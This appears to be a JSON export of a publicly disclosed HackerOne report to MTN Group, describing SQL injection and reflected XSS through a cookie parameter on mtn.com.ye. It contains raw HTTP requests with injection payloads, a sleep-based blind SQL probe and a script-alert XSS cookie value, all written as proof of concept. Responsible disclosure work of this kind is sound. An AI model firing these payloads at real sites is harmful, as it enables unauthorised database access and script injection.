{"id":761304,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83NjEzMDQ=","url":"https://hackerone.com/reports/761304","title":" SQL Injection on cookie parameter","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2019-12-18T21:54:24.783Z","submitted_at":"2019-12-18T21:54:24.783Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"w31rd0","url":"/w31rd0","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/yzGcdKX4gxuccuiytCcyK2NE/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":41919,"url":"https://hackerone.com/mtn_group","handle":"mtn_group","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/F81QA4NLiRgbof5FRQvj1SJG/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/F81QA4NLiRgbof5FRQvj1SJG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"MTN Group","twitter_handle":"","website":"https://www.mtn.com/","about":""}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-05-03T08:58:13.945Z","bug_reporter_agreed_on_going_public_at":"2020-04-03T08:58:12.565Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary:\nHello team. It seams one of the parameters in the cookies is vulnerable to SQL injection. Below requests has the lang parameter in cookies. If you inject one quote mark like '. You get SQL error with the syntax. By injecting a second you have the error removed.\nI did not attempt to exfiltrate data as this is obvious indication of SQLi.\n\n```\nGET /index.php/search/default?t=1\u0026x=0\u0026y=0 HTTP/1.1\nHost: mtn.com.ye\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-GB,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nCookie: PHPSESSID=86ce3d04baa357ffcacf5d013679b696; lang=en'; _ga=GA1.3.1859249834.1576704214; _gid=GA1.3.1031541111.1576704214; _gat=1; _gat_UA-44336198-10=1\nUpgrade-Insecure-Requests: 1\n```\n\nI would like to ask for permission for further exploiting this issue.\n\n## Impact\n\nWeb application is vulnerable to SQL injection, allowing access to data","weakness":{"id":67,"name":"SQL Injection"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":663243,"file_name":"SQLi.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/xznLYfsTfX2tvWiiQomc7C25?response-content-disposition=attachment%3B%20filename%3D%22SQLi.png%22%3B%20filename%2A%3DUTF-8%27%27SQLi.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXEQ3VCGF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T152413Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIQCNbr25hK1JC2i73IX5uE08m1agZwA%2BCyxTPtXmxpZHFAIgA9v21iU9rOtKWjxfMHo7kqQOL4Y8ABbAnucRVLpaC9cqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDOyim%2FBwzSkIWBPCWirXA1TUfPlTIAz6iDfoaiiMP8hivTDD8uDyRJ%2FoAF5UW%2F6cSrWHj2Mtt%2Fx8tKTYSGoQiyhUdi%2BFdxLY35ZRGqE5k10GcpBa5q9ivBUHzTLtIbzvkVLjo0GDs33RjPyv8lT8%2BIT3cR1GpHz5sKugzk1wJHpaXHIGV7TsNZTez5PsxRWLAbodD46%2Bv0aY9dXICvo8Bld1OIiDoUsI3sX2R7SAEjL0B45opfmY7Hh4KKVF9KyCf7etmcGEL0U%2Bjij5TfmuHRxoVJXFKR4WbBKoHXN3cL5AQhAkGBE5bmE6cTsvfhMkCltMfmR1OmQtt1QK7fs2YWSyJhNNnjgzseVzroJk8qcktNvGQQNtmAz%2F0hi%2BbLDdR3r35MBTZtRPxGxwfYKfk%2Blyikhar%2F%2FfPxr6sJoQhbcKSjiziR8cFwFPC97f3qfgH6sVJVvH5AClhLDj9FMqequ01uI1FMQI%2BQ1BJ1t%2Bl3dX7D09OZCMRrk3HvidiN7al4fmx5e0pKMz7tbb23gSzvgiMJbXeHgATiARA8dz6JIoLosFubesB7ZLWq9owsMVaP42CuihB%2Br9J9vu1HkgY4lcWvgRt8bqCjXjWDPBzlNcnc9D32bMJUDfp2BWdJ0BCnpEi4XjrDCyiJGLBjqlAbw%2BQzzkBo5pgpwg2B9K3Kb9khz80zQhxWTR4UFlyZpApeXe135MxtRrVWf1VeEC8qBZynSiicNEE5qSEPmd%2FKNSihzfYJ9PmbUkfZN9yFsrIArapjiCpWMywbnOVNeLSHMFFv8xtfh0sOTI4VetTtHS5BxyHny%2BvnXM6Hjudg5tfOAvbwkv9j%2BTfq0Y0YGFWvyUNrCeX3Y3zQ5t8ked%2FqOvxUSYeg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=f1eb330a8cca31328c9367c897bb1f74c7703f4e1acd89cf1cdfa97154025aa1","file_size":74716,"type":"image/png"}],"allow_singular_disclosure_at":"2020-05-03T08:58:12.607Z","allow_singular_disclosure_after":-45469560.85412683,"singular_disclosure_allowed":true,"vote_count":297,"voters":["abudman","al-madjus","agrippathemagus","wunderwuzzi23","refu","hackerontwowheels","mohamed-magdi","a_d_a_m","w31rd0","zonduu","and 287 more..."],"severity":{"rating":"high","author_type":"User"},"structured_scope":{"databaseId":34325,"asset_type":"URL","asset_identifier":"Mtn.com.ye","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":6583334,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"you can inject further queries to confirm. e.g. '%2b(select*from(select(sleep(20)))a)%2b'\nwill make response be delayed","automated_response":false,"created_at":"2019-12-18T22:06:52.583Z","updated_at":"2019-12-18T22:06:52.583Z","actor":{"username":"w31rd0","cleared":true,"url":"/w31rd0","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/yzGcdKX4gxuccuiytCcyK2NE/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"mtn_group","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6583435,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Also cookie allows XSS as can be observer in attached screenshot F663256. This is a bit harder to execute as it requires someone to set the vale of that cookie to  that value (maybe MiTM attack - which are in scope in your program as i can see).\nThe following request can be used in burp to confirm the issue. \n1) Copy paste below request into burp and send.\n2) Right click on response and select Request in browser -\u003e in original session.\n3) Copy paste the link into the browser and you ll get the popup\n\n```\nGET /index.php/search/default?t=1\u0026x=0\u0026y=0 HTTP/1.1\nHost: mtn.com.ye\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-GB,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nCookie: PHPSESSID=86ce3d04baa357ffcacf5d013679b696; lang=ens4tgl%22%3e%3cscript%3ealert(document.domain)%3c%2fscript%3ecyfn9; _ga=GA1.3.1859249834.1576704214; _gid=GA1.3.1031541111.1576704214; _gat=1; _gat_UA-44336198-10=1\nUpgrade-Insecure-Requests: 1\n```","automated_response":false,"created_at":"2019-12-18T22:21:39.146Z","updated_at":"2019-12-18T22:21:39.146Z","actor":{"username":"w31rd0","cleared":true,"url":"/w31rd0","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/yzGcdKX4gxuccuiytCcyK2NE/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":663256,"filename":"XSS.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/Qb7biWhzoYm2pRnqQAnoc6uQ?response-content-disposition=attachment%3B%20filename%3D%22XSS.png%22%3B%20filename%2A%3DUTF-8%27%27XSS.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXEQ3VCGF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T152413Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIQCNbr25hK1JC2i73IX5uE08m1agZwA%2BCyxTPtXmxpZHFAIgA9v21iU9rOtKWjxfMHo7kqQOL4Y8ABbAnucRVLpaC9cqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDOyim%2FBwzSkIWBPCWirXA1TUfPlTIAz6iDfoaiiMP8hivTDD8uDyRJ%2FoAF5UW%2F6cSrWHj2Mtt%2Fx8tKTYSGoQiyhUdi%2BFdxLY35ZRGqE5k10GcpBa5q9ivBUHzTLtIbzvkVLjo0GDs33RjPyv8lT8%2BIT3cR1GpHz5sKugzk1wJHpaXHIGV7TsNZTez5PsxRWLAbodD46%2Bv0aY9dXICvo8Bld1OIiDoUsI3sX2R7SAEjL0B45opfmY7Hh4KKVF9KyCf7etmcGEL0U%2Bjij5TfmuHRxoVJXFKR4WbBKoHXN3cL5AQhAkGBE5bmE6cTsvfhMkCltMfmR1OmQtt1QK7fs2YWSyJhNNnjgzseVzroJk8qcktNvGQQNtmAz%2F0hi%2BbLDdR3r35MBTZtRPxGxwfYKfk%2Blyikhar%2F%2FfPxr6sJoQhbcKSjiziR8cFwFPC97f3qfgH6sVJVvH5AClhLDj9FMqequ01uI1FMQI%2BQ1BJ1t%2Bl3dX7D09OZCMRrk3HvidiN7al4fmx5e0pKMz7tbb23gSzvgiMJbXeHgATiARA8dz6JIoLosFubesB7ZLWq9owsMVaP42CuihB%2Br9J9vu1HkgY4lcWvgRt8bqCjXjWDPBzlNcnc9D32bMJUDfp2BWdJ0BCnpEi4XjrDCyiJGLBjqlAbw%2BQzzkBo5pgpwg2B9K3Kb9khz80zQhxWTR4UFlyZpApeXe135MxtRrVWf1VeEC8qBZynSiicNEE5qSEPmd%2FKNSihzfYJ9PmbUkfZN9yFsrIArapjiCpWMywbnOVNeLSHMFFv8xtfh0sOTI4VetTtHS5BxyHny%2BvnXM6Hjudg5tfOAvbwkv9j%2BTfq0Y0YGFWvyUNrCeX3Y3zQ5t8ked%2FqOvxUSYeg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=55475459640be8f4a4e2974b7a194494120547a9dbc6d1c8965e5a59fce0f872"}],"genius_execution_id":null,"team_handle":"mtn_group","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6588367,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Î¤his issue might be ranked Critical as well. I was able to get table names. No data exfiltrated yet though. Waiting to confirm permission to proceed with the attack","automated_response":false,"created_at":"2019-12-19T13:02:52.133Z","updated_at":"2019-12-19T13:02:52.133Z","actor":{"username":"w31rd0","cleared":true,"url":"/w31rd0","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/yzGcdKX4gxuccuiytCcyK2NE/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"mtn_group","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6596049,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Sent to investigateion","automated_response":false,"created_at":"2019-12-20T10:53:22.541Z","updated_at":"2019-12-20T10:53:22.541Z","actor":{"username":"cybersecurity_7ibu8","cleared":false,"url":"/cybersecurity_7ibu8","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"mtn_group","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6596169,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello @cybersecurity_7ibu8 \nThank you for the reply. Let me know if you need further information.\nIs it ok with your side if i attempt to see what kind of data can i access via this attack scenario?\nAlso once confirmed can we escalate to critical?","automated_response":false,"created_at":"2019-12-20T11:16:00.156Z","updated_at":"2019-12-20T11:16:00.156Z","actor":{"username":"w31rd0","cleared":true,"url":"/w31rd0","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/yzGcdKX4gxuccuiytCcyK2NE/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"mtn_group","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6697278,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@cybersecurity_7ibu8 any update on this?\nThis is a critical issue i think as you can get access on the web application's database content (admin table and few others included), and when checking a couple of days ago the issue still exists. ","automated_response":false,"created_at":"2020-01-06T10:57:00.937Z","updated_at":"2020-01-06T10:57:00.937Z","actor":{"username":"w31rd0","cleared":true,"url":"/w31rd0","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/yzGcdKX4gxuccuiytCcyK2NE/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"mtn_group","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7223824,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello @cybersecurity_7ibu8.\nSeems this issue is fixed but still in triage, Any update?","automated_response":false,"created_at":"2020-03-04T12:56:43.370Z","updated_at":"2020-03-04T12:56:43.370Z","actor":{"username":"w31rd0","cleared":true,"url":"/w31rd0","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/yzGcdKX4gxuccuiytCcyK2NE/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"mtn_group","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7516267,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2020-04-02T09:55:49.125Z","updated_at":"2020-04-02T09:55:49.125Z","actor":{"username":"vancora","cleared":false,"url":"/vancora","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"w31rd0","url":"/w31rd0"},"genius_execution_id":null,"team_handle":"mtn_group","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7527202,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"wanna disclose?\nits an interesting scenario, as SQLi was in cookie parameter, that people might not normally test, so might be useful for the community","automated_response":false,"created_at":"2020-04-03T08:58:12.581Z","updated_at":"2020-04-03T08:58:12.581Z","first_to_agree":true,"actor":{"username":"w31rd0","cleared":true,"url":"/w31rd0","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/yzGcdKX4gxuccuiytCcyK2NE/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"mtn_group","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7591704,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"any update on this request? @vancora ","automated_response":false,"created_at":"2020-04-09T07:48:20.550Z","updated_at":"2020-04-09T07:48:20.550Z","actor":{"username":"w31rd0","cleared":true,"url":"/w31rd0","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/yzGcdKX4gxuccuiytCcyK2NE/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"mtn_group","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7877545,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-05-03T08:58:13.988Z","updated_at":"2020-05-03T08:58:13.988Z","actor":{"url":"/mtn_group","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/F81QA4NLiRgbof5FRQvj1SJG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"MTN Group"}},"genius_execution_id":null,"team_handle":"mtn_group","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}